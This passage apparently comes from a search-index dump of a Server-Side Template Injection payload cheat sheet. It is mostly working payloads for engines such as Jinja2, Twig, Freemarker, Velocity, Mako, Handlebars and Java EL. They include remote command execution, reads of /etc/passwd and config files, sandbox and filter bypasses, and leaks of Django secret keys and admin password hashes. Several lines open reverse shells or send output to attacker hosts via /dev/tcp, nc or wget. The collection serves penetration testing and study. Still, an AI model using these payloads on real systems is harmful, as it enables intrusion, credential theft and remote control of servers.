@a,@b,@c,@d=Open4.popen4('whoami') %><%= @c.readline()%> Execute code using SSTI for Slim engine. #{ %x|env| } Smarty Official website Smarty is a template engine for PHP. {$smarty.version} {php}echo `id`;{/php} //deprecated in smarty v3 {Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,\"<?php passthru($_GET['cmd']); ?>\",self::clearConfig())} {system('ls')} // compatible v3 {system('cat index.php')} // compatible v3 Twig Official website Twig is a modern template engine for PHP. Twig - Basic injection {{7*7}} {{7*'7'}} would result in 49 {{dump(app)}} {{dump(_context)}} {{app.request.server.all|join(',')}} Twig - Template format $output = $twig > render ( 'Dear' . $_GET['custom_greeting'], array(\"first_name\" => $user.first_name) ); $output = $twig > render ( \"Dear {first_name}\", array(\"first_name\" => $user.first_name) ); Twig - Arbitrary File Reading \"{{'/etc/passwd'|file_excerpt(1,30)}}\"@ {{include(\"wp-config.php\")}} Twig - Code execution {{self}} {{_self.env.setCache(\"ftp://attacker.net:2121\")}}{{_self.env.loadTemplate(\"backdoor\")}} {{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"id\")}} {{['id']|filter('system')}} {{[0]|reduce('system','id')}} {{['id']|map('system')|join}} {{['id',1]|sort('system')|join}} {{['cat\\x20/etc/passwd']|filter('system')}} {{['cat$IFS/etc/passwd']|filter('system')}} Example injecting values to avoid using quotes for the filename (specify via OFFSET and LENGTH where the payload FILENAME is) FILENAME{% set var = dump(_context)[OFFSET:LENGTH] %} {{ include(var) }} Example with an email passing FILTER_VALIDATE_EMAIL PHP. POST /subscribe?0=cat+/etc/passwd HTTP/1.1 email=\"{{app.request.query.filter(0,0,1024,{'options':'system'})}}\"@attacker.tld Velocity Official website Velocity is a Java-based template engine. It permits web page designers to reference methods defined in Java code. #set($str=$class.inspect(\"java.lang.String\").type) #set($chr=$class.inspect(\"java.lang.Character\").type) #set($ex=$class.inspect(\"java.lang.Runtime\").type.getRuntime().exec(\"whoami\")) $ex.waitFor() #set($out=$ex.getInputStream()) #foreach($i in [1..$out.available()]) $str.valueOf($chr.toChars($out.read())) #end References https://nvisium.com/blog/2016/03/11/exploring-ssti-in-flask-jinja2-part-ii/ Yahoo! RCE via Spring Engine SSTI Ruby ERB Template injection - TrustedSec Gist - Server-Side Template Injection - RCE For the Modern WebApp by James Kettle (PortSwigger) PDF - Server-Side Template Injection: RCE for the modern webapp - @albinowax VelocityServlet Expression Language injection Cheatsheet - Flask & Jinja2 SSTI - Sep 3, 2018 \u2022 By phosphore RITSEC CTF 2018 WriteUp (Web) - Aj Dumanhug RCE in Hubspot with EL injection in HubL - @fyoorer Jinja2 template injection filter bypasses - @gehaxelt, @0daywork Gaining Shell using Server Side Template Injection (SSTI) - David Valles - Aug 22, 2018 EXPLOITING SERVER SIDE TEMPLATE INJECTION WITH TPLMAP - BY: DIVINE SELORM TSA - 18 AUG 2018 Server Side Template Injection \u2013 on the example of Pebble - MICHA\u0141 BENTKOWSKI | September 17, 2019 Server-Side Template Injection (SSTI) in ASP.NET Razor - Cl\u00e9ment Notin - 15 APR 2020 Expression Language injection - PortSwigger Bean Stalking: Growing Java beans into RCE - July 7, 2020 - Github Security Lab Remote Code Execution with EL Injection Vulnerabilities - Asif Durani - 29/01/2019 Handlebars template injection and RCE in a Shopify app Lab: Server-side template injection in an unknown language with a documented exploit Exploiting Less.js to Achieve RCE A Pentester's Guide to Server Side Template Injection (SSTI) Django Templates Server-Side Template Injection","title":"Templates Injections"},{"location":"Server%20Side%20Template%20Injection/#templates-injections","text":"Template injection allows an attacker to include template code into an existing (or not) template. A template engine makes designing HTML pages easier by using static template files which at runtime replaces variables/placeholders with actual values in the HTML pages","title":"Templates Injections"},{"location":"Server%20Side%20Template%20Injection/#summary","text":"Templates Injections Summary Tools Methodology ASP.NET Razor ASP.NET Razor - Basic injection ASP.NET Razor - Command execution Expression Language EL Expression Language EL - Basic injection Expression Language EL - One-Liner injections not including code execution Expression Language EL - Code Execution Freemarker Freemarker - Basic injection Freemarker - Read File Freemarker - Code execution Freemarker - Sandbox bypass Groovy Groovy - Basic injection Groovy - Read and create File Groovy - HTTP request: Groovy - Command Execution Groovy - Sandbox Bypass Handlebars Handlebars - Command Execution Jade / Codepen Java Java - Basic injection Java - Retrieve the system\u2019s environment variables Java - Retrieve /etc/passwd Django Template Jinja2 Jinja2 - Basic injection Jinja2 - Template format Jinja2 - Debug Statement Jinja2 - Dump all used classes Jinja2 - Dump all config variables Jinja2 - Read remote file Jinja2 - Write into remote file Jinja2 - Remote Code Execution Exploit the SSTI by calling os.popen().read() Exploit the SSTI by calling subprocess.Popen Exploit the SSTI by calling Popen without guessing the offset Exploit the SSTI by writing an evil config file. Jinja2 - Filter bypass Jinjava Jinjava - Basic injection Jinjava - Command execution Lessjs Lessjs - SSRF / LFI Lessjs < v3 - Command Execution Plugins Mako Direct access to os from TemplateNamespace: Pebble Pebble - Basic injection Pebble - Code execution Ruby Ruby - Basic injections Ruby - Retrieve /etc/passwd Ruby - List files and directories Ruby - Code execution Smarty Twig Twig - Basic injection Twig - Template format Twig - Arbitrary File Reading Twig - Code execution Velocity References","title":"Summary"},{"location":"Server%20Side%20Template%20Injection/#tools","text":"Recommended tool: Tplmap e.g: python2.7 ./tplmap.py -u 'http://www.target.com/page?name=John*' --os-shell python2.7 ./tplmap.py -u \"http://192.168.56.101:3000/ti?user=*&comment=supercomment&link\" python2.7 ./tplmap.py -u \"http://192.168.56.101:3000/ti?user=InjectHere*&comment=A&link\" --level 5 -e jade","title":"Tools"},{"location":"Server%20Side%20Template%20Injection/#methodology","text":"","title":"Methodology"},{"location":"Server%20Side%20Template%20Injection/#detection","text":"In most cases, this polyglot payload will trigger an error in presence of a SSTI vulnerability : ${{<%[%'\"}}%\\.","title":"Detection"},{"location":"Server%20Side%20Template%20Injection/#aspnet-razor","text":"Official website Razor is a markup syntax that lets you embed server-based code (Visual Basic and C#) into web pages.","title":"ASP.NET Razor"},{"location":"Server%20Side%20Template%20Injection/#aspnet-razor-basic-injection","text":"@(1+2)","title":"ASP.NET Razor - Basic injection"},{"location":"Server%20Side%20Template%20Injection/#aspnet-razor-command-execution","text":"@{ // C# code }","title":"ASP.NET Razor - Command execution"},{"location":"Server%20Side%20Template%20Injection/#expression-language-el","text":"Official website Expression Language (EL) is mechanism that simplifies the accessibility of the data stored in Java bean component and other object like request, session and application, etc. There are many operators in JSP that are used in EL like arithmetic and logical operators to perform an expression. It was introduced in JSP 2.0","title":"Expression Language EL"},{"location":"Server%20Side%20Template%20Injection/#expression-language-el-basic-injection","text":"${1+1} #{1+1}","title":"Expression Language EL - Basic injection"},{"location":"Server%20Side%20Template%20Injection/#expression-language-el-one-liner-injections-not-including-code-execution","text":"// DNS Lookup ${\"\".getClass().forName(\"java.net.InetAddress\").getMethod(\"getByName\",\"\".getClass()).invoke(\"\",\"xxxxxxxxxxxxxx.burpcollaborator.net\")} // JVM System Property Lookup (ex: java.class.path) ${\"\".getClass().forName(\"java.lang.System\").getDeclaredMethod(\"getProperty\",\"\".getClass()).invoke(\"\",\"java.class.path\")}","title":"Expression Language EL - One-Liner injections not including code execution"},{"location":"Server%20Side%20Template%20Injection/#expression-language-el-code-execution","text":"// Common RCE payloads ''.class.forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec(<COMMAND STRING/ARRAY>) ''.class.forName('java.lang.ProcessBuilder').getDeclaredConstructors()[1].newInstance(<COMMAND ARRAY/LIST>).start() // Method using Runtime #{session.setAttribute(\"rtc\",\"\".getClass().forName(\"java.lang.Runtime\").getDeclaredConstructors()[0])} #{session.getAttribute(\"rtc\").setAccessible(true)} #{session.getAttribute(\"rtc\").getRuntime().exec(\"/bin/bash -c whoami\")} // Method using process builder ${request.setAttribute(\"c\",\"\".getClass().forName(\"java.util.ArrayList\").newInstance())} ${request.getAttribute(\"c\").add(\"cmd.exe\")} ${request.getAttribute(\"c\").add(\"/k\")} ${request.getAttribute(\"c\").add(\"ping x.x.x.x\")} ${request.setAttribute(\"a\",\"\".getClass().forName(\"java.lang.ProcessBuilder\").getDeclaredConstructors()[0].newInstance(request.getAttribute(\"c\")).start())} ${request.getAttribute(\"a\")} // Method using Reflection & Invoke ${\"\".getClass().forName(\"java.lang.Runtime\").getMethods()[6].invoke(\"\".getClass().forName(\"java.lang.Runtime\")).exec(\"calc.exe\")} // Method using ScriptEngineManager one-liner ${request.getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"js\").eval(\"java.lang.Runtime.getRuntime().exec(\\\\\\\"ping x.x.x.x\\\\\\\")\"))} // Method using ScriptEngineManager ${facesContext.getExternalContext().setResponseHeader(\"output\",\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\\\"var x=new java.lang.ProcessBuilder;x.command(\\\\\\\"wget\\\\\\\",\\\\\\\"http://x.x.x.x/1.sh\\\\\\\");org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\\\"))}","title":"Expression Language EL - Code Execution"},{"location":"Server%20Side%20Template%20Injection/#freemarker","text":"Official website Apache FreeMarker\u2122 is a template engine: a Java library to generate text output (HTML web pages, e-mails, configuration files, source code, etc.) based on templates and changing data. You can try your payloads at https://try.freemarker.apache.org","title":"Freemarker"},{"location":"Server%20Side%20Template%20Injection/#freemarker-basic-injection","text":"The template can be ${3*3} or the legacy #{3*3} .","title":"Freemarker - Basic injection"},{"location":"Server%20Side%20Template%20Injection/#freemarker-read-file","text":"${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('path_to_the_file').toURL().openStream().readAllBytes()?join(\" \")} Convert the returned bytes to ASCII","title":"Freemarker - Read File"},{"location":"Server%20Side%20Template%20Injection/#freemarker-code-execution","text":"<#assign ex = \"freemarker.template.utility.Execute\"?new()>${ ex(\"id\")} [#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')} ${\"freemarker.template.utility.Execute\"?new()(\"id\")}","title":"Freemarker - Code execution"},{"location":"Server%20Side%20Template%20Injection/#freemarker-sandbox-bypass","text":":warning: only works on Freemarker versions below 2.3.30 <#assign classloader=article.class.protectionDomain.classLoader> <#assign owc=classloader.loadClass(\"freemarker.template.ObjectWrapper\")> <#assign dwf=owc.getField(\"DEFAULT_WRAPPER\").get(null)> <#assign ec=classloader.loadClass(\"freemarker.template.utility.Execute\")> ${dwf.newInstance(ec,null)(\"id\")}","title":"Freemarker - Sandbox bypass"},{"location":"Server%20Side%20Template%20Injection/#groovy","text":"Official website","title":"Groovy"},{"location":"Server%20Side%20Template%20Injection/#groovy-basic-injection","text":"Refer to https://groovy-lang.org/syntax.html , but ${9*9} is the basic injection.","title":"Groovy - Basic injection"},{"location":"Server%20Side%20Template%20Injection/#groovy-read-and-create-file","text":"${String x = new File('c:/windows/notepad.exe').text} ${String x = new File('/path/to/file').getText('UTF-8')} ${new File(\"C:\\Temp\\FileName.txt\").createNewFile();}","title":"Groovy - Read and create File"},{"location":"Server%20Side%20Template%20Injection/#groovy-http-request","text":"${\"http://www.google.com\".toURL().text} ${new URL(\"http://www.google.com\").getText()}","title":"Groovy - HTTP request:"},{"location":"Server%20Side%20Template%20Injection/#groovy-command-execution","text":"${\"calc.exe\".exec()} ${\"calc.exe\".execute()} ${this.evaluate(\"9*9\") //(this is a Script class)} ${new org.codehaus.groovy.runtime.MethodClosure(\"calc.exe\",\"execute\").call()}","title":"Groovy - Command Execution"},{"location":"Server%20Side%20Template%20Injection/#groovy-sandbox-bypass","text":"${ @ASTTest(value={assert java.lang.Runtime.getRuntime().exec(\"whoami\")}) def x } or ${ new groovy.lang.GroovyClassLoader().parseClass(\"@groovy.transform.ASTTest(value={assert java.lang.Runtime.getRuntime().exec(\\\"calc.exe\\\")})def x\") }","title":"Groovy - Sandbox Bypass"},{"location":"Server%20Side%20Template%20Injection/#handlebars","text":"Official website Handlebars compiles templates into JavaScript functions.","title":"Handlebars"},{"location":"Server%20Side%20Template%20Injection/#handlebars-command-execution","text":"{{#with \"s\" as |string|}} {{#with \"e\"}} {{#with split as |conslist|}} {{this.pop}} {{this.push (lookup string.sub \"constructor\")}} {{this.pop}} {{#with string.split as |codelist|}} {{this.pop}} {{this.push \"return require('child_process').execSync('ls -la');\"}} {{this.pop}} {{#each conslist}} {{#with (string.sub.apply 0 codelist)}} {{this}} {{/with}} {{/each}} {{/with}} {{/with}} {{/with}} {{/with}}","title":"Handlebars - Command Execution"},{"location":"Server%20Side%20Template%20Injection/#jade-codepen","text":"Official website - var x = root.process - x = x.mainModule.require - x = x('child_process') = x.exec('id | nc attacker.net 80') #{root.process.mainModule.require('child_process').spawnSync('cat', ['/etc/passwd']).stdout}","title":"Jade / Codepen"},{"location":"Server%20Side%20Template%20Injection/#java","text":"","title":"Java"},{"location":"Server%20Side%20Template%20Injection/#java-basic-injection","text":"Multiple variable expressions can be used, if ${...} doesn't work try #{...} , *{...} , @{...} or ~{...} . ${7*7} ${{7*7}} ${class.getClassLoader()} ${class.getResource(\"\").getPath()} ${class.getResource(\"../../../../../index.htm\").getContent()}","title":"Java - Basic injection"},{"location":"Server%20Side%20Template%20Injection/#java-retrieve-the-systems-environment-variables","text":"${T(java.lang.System).getenv()}","title":"Java - Retrieve the system\u2019s environment variables"},{"location":"Server%20Side%20Template%20Injection/#java-retrieve-etcpasswd","text":"${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')} ${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}","title":"Java - Retrieve /etc/passwd"},{"location":"Server%20Side%20Template%20Injection/#django-templates","text":"Django template language supports 2 rendering engines by default: Django Templates (DT) and Jinja2. Django Templates is much simpler engine. It does not allow calling of passed object functions and impact of SSTI in DT is often less severe than in Jinja2.","title":"Django Templates"},{"location":"Server%20Side%20Template%20Injection/#detection_1","text":"{% csrf_token %} # Causes error with Jinja2 {{ 7*7 }} # Error with Django Templates ih0vr{{364|add:733}}d121r # Burp Payload -> ih0vr1097d121r","title":"Detection"},{"location":"Server%20Side%20Template%20Injection/#django-templates-for-post-exploitation","text":"# Variables {{ variable }} {{ variable.attr }} # Filters {{ value|length }} # Tags {% csrf_token %}","title":"Django Templates for post-exploitation"},{"location":"Server%20Side%20Template%20Injection/#cross-site-scripting","text":"{{ '<script>alert(3)</script>' }} {{ '<script>alert(3)</script>' | safe }}","title":"Cross-site scripting"},{"location":"Server%20Side%20Template%20Injection/#debug-information-leak","text":"{% debug %}","title":"Debug information leak"},{"location":"Server%20Side%20Template%20Injection/#leaking-apps-secret-key","text":"{{ messages.storages.0.signer.key }}","title":"Leaking app\u2019s Secret Key"},{"location":"Server%20Side%20Template%20Injection/#admin-site-url-leak","text":"{% include 'admin/base.html' %}","title":"Admin Site URL leak"},{"location":"Server%20Side%20Template%20Injection/#admin-username-and-password-hash-leak","text":"{% load log %}{% get_admin_log 10 as log %}{% for e in log %} {{e.user.get_username}} : {{e.user.password}}{% endfor %}","title":"Admin username and password hash leak"},{"location":"Server%20Side%20Template%20Injection/#jinja2","text":"Official website Jinja2 is a full featured template engine for Python. It has full unicode support, an optional integrated sandboxed execution environment, widely used and BSD licensed.","title":"Jinja2"},{"location":"Server%20Side%20Template%20Injection/#jinja2-basic-injection","text":"{{4*4}}[[5*5]] {{7*'7'}} would result in 7777777 {{config.items()}} Jinja2 is used by Python Web Frameworks such as Django or Flask. The above injections have been tested on a Flask application.","title":"Jinja2 - Basic injection"},{"location":"Server%20Side%20Template%20Injection/#jinja2-template-format","text":"{% extends \"layout.html\" %} {% block body %} <ul> {% for user in users %} <li><a href=\"{{ user.url }}\">{{ user.username }}</a></li> {% endfor %} </ul> {% endblock %}","title":"Jinja2 - Template format"},{"location":"Server%20Side%20Template%20Injection/#jinja2-debug-statement","text":"If the Debug Extension is enabled, a {% debug %} tag will be available to dump the current context as well as the available filters and tests. This is useful to see what\u2019s available to use in the template without setting up a debugger. <pre>{% debug %}</pre> Source: https://jinja.palletsprojects.com/en/2.11.x/templates/#debug-statement","title":"Jinja2 - Debug Statement"},{"location":"Server%20Side%20Template%20Injection/#jinja2-dump-all-used-classes","text":"{{ [].class.base.subclasses() }} {{''.class.mro()[1].subclasses()}} {{ ''.__class__.__mro__[2].__subclasses__() }}","title":"Jinja2 - Dump all used classes"},{"location":"Server%20Side%20Template%20Injection/#jinja2-dump-all-config-variables","text":"{% for key, value in config.iteritems() %} <dt>{{ key|e }}</dt> <dd>{{ value|e }}</dd> {% endfor %}","title":"Jinja2 - Dump all config variables"},{"location":"Server%20Side%20Template%20Injection/#jinja2-read-remote-file","text":"# ''.__class__.__mro__[2].__subclasses__()[40] = File class {{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }} {{ config.items()[4][1].__class__.__mro__[2].__subclasses__()[40](\"/tmp/flag\").read() }} # https://github.com/pallets/flask/blob/master/src/flask/helpers.py#L398 {{ get_flashed_messages.__globals__.__builtins__.open(\"/etc/passwd\").read() }}","title":"Jinja2 - Read remote file"},{"location":"Server%20Side%20Template%20Injection/#jinja2-write-into-remote-file","text":"{{ ''.__class__.__mro__[2].__subclasses__()[40]('/var/www/html/myflaskapp/hello.txt', 'w').write('Hello here !') }}","title":"Jinja2 - Write into remote file"},{"location":"Server%20Side%20Template%20Injection/#jinja2-remote-code-execution","text":"Listen for connection nc -lnvp 8000","title":"Jinja2 - Remote Code Execution"},{"location":"Server%20Side%20Template%20Injection/#exploit-the-ssti-by-calling-ospopenread","text":"These payloads are context-free, and do not require anything, except being in a jinja2 Template object: {{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }} {{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('id').read() }} {{ self._TemplateReference__context.namespace.__init__.__globals__.os.popen('id').read() }} We can use these shorter payloads (this is the shorter payloads known yet): {{ cycler.__init__.__globals__.os.popen('id').read() }} {{ joiner.__init__.__globals__.os.popen('id').read() }} {{ namespace.__init__.__globals__.os.popen('id').read() }} Source @podalirius_ : https://podalirius.net/en/articles/python-vulnerabilities-code-execution-in-jinja-templates/","title":"Exploit the SSTI by calling os.popen().read()"},{"location":"Server%20Side%20Template%20Injection/#exploit-the-ssti-by-calling-subprocesspopen","text":":warning: the number 396 will vary depending of the application. {{''.__class__.mro()[1].__subclasses__()[396]('cat flag.txt',shell=True,stdout=-1).communicate()[0].strip()}} {{config.__class__.__init__.__globals__['os'].popen('ls').read()}}","title":"Exploit the SSTI by calling subprocess.Popen"},{"location":"Server%20Side%20Template%20Injection/#exploit-the-ssti-by-calling-popen-without-guessing-the-offset","text":"{% for x in ().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(\"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"ip\\\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\"/bin/cat\\\", \\\"flag.txt\\\"]);'\").read().zfill(417)}}{%endif%}{% endfor %} Simply modification of payload to clean up output and facilitate command input (https://twitter.com/SecGus/status/1198976764351066113) In another GET parameter include a variable named \"input\" that contains the command you want to run (For example: &input=ls) {% for x in ().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}","title":"Exploit the SSTI by calling Popen without guessing the offset"},{"location":"Server%20Side%20Template%20Injection/#exploit-the-ssti-by-writing-an-evil-config-file","text":"# evil config {{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\\n\\nRUNCMD = check_output\\n') }} # load the evil config {{ config.from_pyfile('/tmp/evilconfig.cfg') }} # connect to evil host {{ config['RUNCMD']('/bin/bash -c \"/bin/bash -i >& /dev/tcp/x.x.x.x/8000 0>&1\"',shell=True) }}","title":"Exploit the SSTI by writing an evil config file."},{"location":"Server%20Side%20Template%20Injection/#jinja2-filter-bypass","text":"request.__class__ request[\"__class__\"] Bypassing _ http://localhost:5000/?exploit={{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}}&class=class&usc=_ {{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}} {{request|attr([\"_\"*2,\"class\",\"_\"*2]|join)}} {{request|attr([\"__\",\"class\",\"__\"]|join)}} {{request|attr(\"__class__\")}} {{request.__class__}} Bypassing [ and ] http://localhost:5000/?exploit={{request|attr((request.args.usc*2,request.args.class,request.args.usc*2)|join)}}&class=class&usc=_ or http://localhost:5000/?exploit={{request|attr(request.args.getlist(request.args.l)|join)}}&l=a&a=_&a=_&a=class&a=_&a=_ Bypassing |join http://localhost:5000/?exploit={{request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a))}}&f=%s%sclass%s%s&a=_ Bypassing most common filters ('.','_','|join','[',']','mro' and 'base') by https://twitter.com/SecGus: {{request|attr('application')|attr('\\x5f\\x5fglobals\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fbuiltins\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fimport\\x5f\\x5f')('os')|attr('popen')('id')|attr('read')()}}","title":"Jinja2 - Filter bypass"},{"location":"Server%20Side%20Template%20Injection/#jinjava","text":"Official website Java-based template engine based on django template syntax, adapted to render jinja templates (at least the subset of jinja in use in HubSpot content).","title":"Jinjava"},{"location":"Server%20Side%20Template%20Injection/#jinjava-basic-injection","text":"{{'a'.toUpperCase()}} would result in 'A' {{ request }} would return a request object like com.[...].context.TemplateContextRequest@23548206 Jinjava is an open source project developed by Hubspot, available at https://github.com/HubSpot/jinjava/","title":"Jinjava - Basic injection"},{"location":"Server%20Side%20Template%20Injection/#jinjava-command-execution","text":"Fixed by https://github.com/HubSpot/jinjava/pull/230 {{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\\\"new java.lang.String('xxx')\\\")}} {{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\\\"var x=new java.lang.ProcessBuilder; x.command(\\\\\\\"whoami\\\\\\\"); x.start()\\\")}} {{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\\\"var x=new java.lang.ProcessBuilder; x.command(\\\\\\\"netstat\\\\\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\\\")}} {{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\\\"var x=new java.lang.ProcessBuilder; x.command(\\\\\\\"uname\\\\\\\",\\\\\\\"-a\\\\\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\\\")}}","title":"Jinjava - Command execution"},{"location":"Server%20Side%20Template%20Injection/#lessjs","text":"Official website Less (which stands for Leaner Style Sheets) is a backwards-compatible language extension for CSS. This is the official documentation for Less, the language and Less.js, the JavaScript tool that converts your Less styles to CSS styles.","title":"Lessjs"},{"location":"Server%20Side%20Template%20Injection/#lessjs-ssrf-lfi","text":"@import (inline) \"http://localhost\"; // or @import (inline) \"/etc/passwd\";","title":"Lessjs - SSRF / LFI"},{"location":"Server%20Side%20Template%20Injection/#lessjs-v3-command-execution","text":"body { color: `global.process.mainModule.require(\"child_process\").execSync(\"id\")`; }","title":"Lessjs &lt; v3 - Command Execution"},{"location":"Server%20Side%20Template%20Injection/#plugins","text":"Lessjs plugins can be remotely included and are composed of Javascript which gets executed when the Less is transpiled. // example local plugin usage @plugin \"plugin-2.7.js\"; or // example remote plugin usage @plugin \"http://example.com/plugin-2.7.js\" version 2 example RCE plugin: functions.add('cmd', function(val) { return `\"${global.process.mainModule.require('child_process').execSync(val.value)}\"`; }); version 3 and above example RCE plugin //Vulnerable plugin (3.13.1) registerPlugin({ install: function(less, pluginManager, functions) { functions.add('cmd', function(val) { return global.process.mainModule.require('child_process').execSync(val.value).toString(); }); } })","title":"Plugins"},{"location":"Server%20Side%20Template%20Injection/#mako","text":"Official website Mako is a template library written in Python. Conceptually, Mako is an embedded Python (i.e. Python Server Page) language, which refines the familiar ideas of componentized layout and inheritance to produce one of the most straightforward and flexible models available, while also maintaining close ties to Python calling and scoping semantics. <% import os x=os.popen('id').read() %> ${x}","title":"Mako"},{"location":"Server%20Side%20Template%20Injection/#direct-access-to-os-from-templatenamespace","text":"Any of these payloads allows direct access to the os module ${self.module.cache.util.os.system(\"id\")} ${self.module.runtime.util.os.system(\"id\")} ${self.template.module.cache.util.os.system(\"id\")} ${self.module.cache.compat.inspect.os.system(\"id\")} ${self.__init__.__globals__['util'].os.system('id')} ${self.template.module.runtime.util.os.system(\"id\")} ${self.module.filters.compat.inspect.os.system(\"id\")} ${self.module.runtime.compat.inspect.os.system(\"id\")} ${self.module.runtime.exceptions.util.os.system(\"id\")} ${self.template.__init__.__globals__['os'].system('id')} ${self.module.cache.util.compat.inspect.os.system(\"id\")} ${self.module.runtime.util.compat.inspect.os.system(\"id\")} ${self.template._mmarker.module.cache.util.os.system(\"id\")} ${self.template.module.cache.compat.inspect.os.system(\"id\")} ${self.module.cache.compat.inspect.linecache.os.system(\"id\")} ${self.template._mmarker.module.runtime.util.os.system(\"id\")} ${self.attr._NSAttr__parent.module.cache.util.os.system(\"id\")} ${self.template.module.filters.compat.inspect.os.system(\"id\")} ${self.template.module.runtime.compat.inspect.os.system(\"id\")} ${self.module.filters.compat.inspect.linecache.os.system(\"id\")} ${self.module.runtime.compat.inspect.linecache.os.system(\"id\")} ${self.template.module.runtime.exceptions.util.os.system(\"id\")} ${self.attr._NSAttr__parent.module.runtime.util.os.system(\"id\")} ${self.context._with_template.module.cache.util.os.system(\"id\")} ${self.module.runtime.exceptions.compat.inspect.os.system(\"id\")} ${self.template.module.cache.util.compat.inspect.os.system(\"id\")} ${self.context._with_template.module.runtime.util.os.system(\"id\")} ${self.module.cache.util.compat.inspect.linecache.os.system(\"id\")} ${self.template.module.runtime.util.compat.inspect.os.system(\"id\")} ${self.module.runtime.util.compat.inspect.linecache.os.system(\"id\")} ${self.module.runtime.exceptions.traceback.linecache.os.system(\"id\")} ${self.module.runtime.exceptions.util.compat.inspect.os.system(\"id\")} ${self.template._mmarker.module.cache.compat.inspect.os.system(\"id\")} ${self.template.module.cache.compat.inspect.linecache.os.system(\"id\")} ${self.attr._NSAttr__parent.template.module.cache.util.os.system(\"id\")} ${self.template._mmarker.module.filters.compat.inspect.os.system(\"id\")} ${self.template._mmarker.module.runtime.compat.inspect.os.system(\"id\")} ${self.attr._NSAttr__parent.module.cache.compat.inspect.os.system(\"id\")} ${self.template._mmarker.module.runtime.exceptions.util.os.system(\"id\")} ${self.template.module.filters.compat.inspect.linecache.os.system(\"id\")} ${self.template.module.runtime.compat.inspect.linecache.os.system(\"id\")} ${self.attr._NSAttr__parent.template.module.runtime.util.os.system(\"id\")} ${self.context._with_template._mmarker.module.cache.util.os.system(\"id\")} ${self.template.module.runtime.exceptions.compat.inspect.os.system(\"id\")} ${self.attr._NSAttr__parent.module.filters.compat.inspect.os.system(\"id\")} ${self.attr._NSAttr__parent.module.runtime.compat.inspect.os.system(\"id\")} ${self.context._with_template.module.cache.compat.inspect.os.system(\"id\")} ${self.module.runtime.exceptions.compat.inspect.linecache.os.system(\"id\")} ${self.attr._NSAttr__parent.module.runtime.exceptions.util.os.system(\"id\")} ${self.context._with_template._mmarker.module.runtime.util.os.system(\"id\")} ${self.context._with_template.module.filters.compat.inspect.os.system(\"id\")} ${self.context._with_template.module.runtime.compat.inspect.os.system(\"id\")} ${self.context._with_template.module.runtime.exceptions.util.os.system(\"id\")} ${self.template.module.runtime.exceptions.traceback.linecache.os.system(\"id\")} PoC : >>> print(Template(\"${self.module.cache.util.os}\").render()) <module 'os' from '/usr/local/lib/python3.10/os.py'> Source @podalirius_ : https://podalirius.net/en/articles/python-context-free-payloads-in-mako-templates/","title":"Direct access to os from TemplateNamespace:"},{"location":"Server%20Side%20Template%20Injection/#pebble","text":"Official website Pebble is a Java templating engine inspired by Twig and similar to the Python Jinja Template Engine syntax. It features templates inheritance and easy-to-read syntax, ships with built-in autoescaping for security, and includes integrated support for internationalization.","title":"Pebble"},{"location":"Server%20Side%20Template%20Injection/#pebble-basic-injection","text":"{{ someString.toUPPERCASE() }}","title":"Pebble - Basic injection"},{"location":"Server%20Side%20Template%20Injection/#pebble-code-execution","text":"Old version of Pebble ( < version 3.0.9): {{ variable.getClass().forName('java.lang.Runtime').getRuntime().exec('ls -la') }} . New version of Pebble : {% set cmd = 'id' %} {% set bytes = (1).TYPE .forName('java.lang.Runtime') .methods[6] .invoke(null,null) .exec(cmd) .inputStream .readAllBytes() %} {{ (1).TYPE .forName('java.lang.String') .constructors[0] .newInstance(([bytes]).toArray()) }}","title":"Pebble - Code execution"},{"location":"Server%20Side%20Template%20Injection/#ruby","text":"","title":"Ruby"},{"location":"Server%20Side%20Template%20Injection/#ruby-basic-injections","text":"ERB: <%= 7 * 7 %> Slim: #{ 7 * 7 }","title":"Ruby - Basic 